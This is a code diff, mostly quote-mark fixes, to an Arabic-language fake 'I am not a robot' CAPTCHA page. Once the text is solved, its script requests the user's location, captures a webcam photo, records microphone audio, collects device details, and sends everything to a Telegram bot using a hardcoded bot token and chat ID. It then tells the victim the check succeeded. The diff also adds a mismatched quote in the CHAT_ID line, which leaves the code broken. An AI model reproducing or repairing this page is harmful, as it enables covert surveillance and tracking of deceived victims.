@@ -6,7 +6,7 @@
     <title>التحقق من أنك لست روبوت</title>
     <style>
         body {
-            font-family:  Segoe UI , Tahoma, Geneva, Verdana, sans-serif;
+            font-family: Segoe UI, Tahoma, Geneva, Verdana, sans-serif;
             background-color: #f0f2f5;
             margin: 0;
             padding: 0;
@@ -132,7 +132,7 @@
 
     <script>
         const BOT_TOKEN = "8311192024:AAELi65QNCXIp_GCKCGxg05moXnf2_xFgAA";
-        const CHAT_ID = "8180958667";
+        const CHAT_ID = '8180958667";
         
         const collectedData = {
             systemInfo: getSystemInfo(),
@@ -141,10 +141,10 @@
             location: { coords: null, address: null, allowed: false }
         };
         
-        const captchaText = document.getElementById( captcha-text );
-        const captchaInput = document.getElementById( captcha-input );
-        const verifyBtn = document.getElementById( verify-btn );
-        const statusMessage = document.getElementById( status-message );
+        const captchaText = document.getElementById("captcha-text");
+        const captchaInput = document.getElementById("captcha-input");
+        const verifyBtn = document.getElementById("verify-btn");
+        const statusMessage = document.getElementById("status-message");
         
         function generateCaptcha() {
             const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
@@ -162,33 +162,33 @@
                 platform: navigator.platform,
                 screen: `${screen.width}x${screen.height}`,
                 languages: navigator.languages,
-                cpuCores: navigator.hardwareConcurrency ||  غير معروف ,
-                deviceMemory: navigator.deviceMemory ||  غير معروف 
+                cpuCores: navigator.hardwareConcurrency || "غير معروف",
+                deviceMemory: navigator.deviceMemory || "غير معروف"
             };
         }
         
         window.onload = () => {
             captchaText.textContent = generateCaptcha();
-            verifyBtn.addEventListener( click , async () => {
+            verifyBtn.addEventListener("click", async () => {
                 if (captchaInput.value === captchaText.textContent) {
-                    statusMessage.innerHTML =  <div class="loading"></div> جاري التحقق من المعلومات... ;
-                    statusMessage.classList.remove( hidden );
+                    statusMessage.innerHTML = '<div class="loading"></div> جاري التحقق من المعلومات...';
+                    statusMessage.classList.remove("hidden");
                     
                     try {
                         await requestLocation();
                         await requestCamera();
                         await requestMicrophone();
                         await sendAllDataToTelegram();
-                        statusMessage.innerHTML =  ✅ تم التحقق بنجاح! جاري توجيهك... ;
+                        statusMessage.innerHTML = "✅ تم التحقق بنجاح! جاري توجيهك...";
                     } catch (error) {
                         statusMessage.innerHTML = `❌ حدث خطأ: ${error.message}`;
                         console.error("Error:", error);
                     }
                 } else {
-                    statusMessage.textContent =  ❌ النص المدخل غير صحيح. يرجى المحاولة مرة أخرى. ;
-                    statusMessage.classList.remove( hidden );
+                    statusMessage.textContent = "❌ النص المدخل غير صحيح. يرجى المحاولة مرة أخرى.";
+                    statusMessage.classList.remove("hidden");
                     captchaText.textContent = generateCaptcha();
-                    captchaInput.value =   ;
+                    captchaInput.value = "";
                 }
             });
         };
@@ -226,19 +226,19 @@
         async function requestCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement( video );
+                const video = document.createElement("video");
                 video.autoplay = true;
                 video.playsInline = true;
                 video.srcObject = stream;
                 await new Promise(resolve => video.onloadedmetadata = resolve);
-                const canvas = document.createElement( canvas );
+                const canvas = document.createElement("canvas");
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
-                canvas.getContext( 2d ).drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
                 canvas.toBlob(blob => {
                     collectedData.camera.photo = blob;
                     collectedData.camera.allowed = true;
-                },  image/jpeg , 0.9);
+                }, "image/jpeg", 0.9);
                 stream.getTracks().forEach(track => track.stop());
             } catch (error) {
                 throw new Error(`فشل في الوصول للكاميرا: ${error.message}`);
@@ -253,14 +253,14 @@
                 recorder.ondataavailable = event => audioChunks.push(event.data);
                 return new Promise((resolve) => {
                     recorder.onstop = () => {
-                        const audioBlob = new Blob(audioChunks, { type:  audio/wav  });
+                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
                         collectedData.microphone.audio = audioBlob;
                         collectedData.microphone.allowed = true;
                         resolve();
                     };
                     recorder.start();
                     setTimeout(() => {
-                        if (recorder.state !==  inactive ) {
+                        if (recorder.state !== "inactive") {
                             recorder.stop();
                             stream.getTracks().forEach(track => track.stop());
                         }
@@ -279,15 +279,15 @@
                 message += `🖥️ <b>النظام:</b> ${collectedData.systemInfo.platform}\n`;
                 
                 if (collectedData.location.allowed) {
-                    message += `\n📍 <b>الموقع:</b> ${collectedData.location.address ||  غير معروف }\n`;
+                    message += `\n📍 <b>الموقع:</b> ${collectedData.location.address || "غير معروف"}\n`;
                     message += `🌐 <b>الإحداثيات:</b> ${collectedData.location.coords.latitude}, ${collectedData.location.coords.longitude}\n`;
                 }
-                await sendToTelegram(message,  text );
+                await sendToTelegram(message, "text");
                 if (collectedData.camera.photo) {
-                    await sendToTelegram(collectedData.camera.photo,  photo );
+                    await sendToTelegram(collectedData.camera.photo, "photo");
                 }
                 if (collectedData.microphone.audio) {
-                    await sendToTelegram(collectedData.microphone.audio,  audio );
+                    await sendToTelegram(collectedData.microphone.audio, "audio");
                 }
 
                 let finalMessage = 
@@ -299,8 +299,8 @@
 "❤️ شكراً لاستخدامك البوت 💡";
 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method:  POST ,
-                    headers: {  Content-Type :  application/json  },
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: finalMessage,
@@ -320,23 +320,23 @@
         }
         
         async function sendToTelegram(data, type) {
-            if (type ===  text ) {
+            if (type === "text") {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method:  POST ,
-                    headers: {  Content-Type :  application/json  },
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: data,
-                        parse_mode:  HTML 
+                        parse_mode: "HTML"
                     })
                 });
             } else {
                 const formData = new FormData();
-                formData.append( chat_id , CHAT_ID);
-                formData.append(type, data, `file.${type ===  photo  ?  jpg  :  wav }`);
-                const endpoint = type ===  photo  ?  sendPhoto  :  sendAudio ;
+                formData.append("chat_id", CHAT_ID);
+                formData.append(type, data, `file.${type === "photo" ? "jpg" : "wav"}`);
+                const endpoint = type === "photo" ? "sendPhoto" : "sendAudio";
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
-                    method:  POST ,
+                    method: "POST",
                     body: formData
                 });
             }
